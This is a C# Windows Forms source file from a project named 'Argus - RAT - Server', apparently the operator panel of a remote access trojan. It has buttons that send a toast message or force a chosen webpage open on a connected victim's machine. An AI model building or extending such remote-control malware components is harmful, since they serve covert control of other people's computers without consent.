using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Argus___RAT___Server
{
    public partial class CategoryMessaging : Form
    {
        Commands cmd = null;

        public CategoryMessaging(String currentClient)
        {
            InitializeComponent();

            cmd = new Commands(currentClient);
        }

        private void buttonSendToast_Click(object sender, EventArgs e)
        {
            String text = textBoxToast.Text;
            if (cmd.SendToast(text))
                MessageBox.Show("Toast has been sent!", "Sent!");
        }

        private void buttonOpenWebpage_Click(object sender, EventArgs e)
        {
            String text = textBoxWebpage.Text;
            if (cmd.OpenWebpage(text))
                MessageBox.Show("Webpage has been sent!", "Sent!");
        }
    }
}
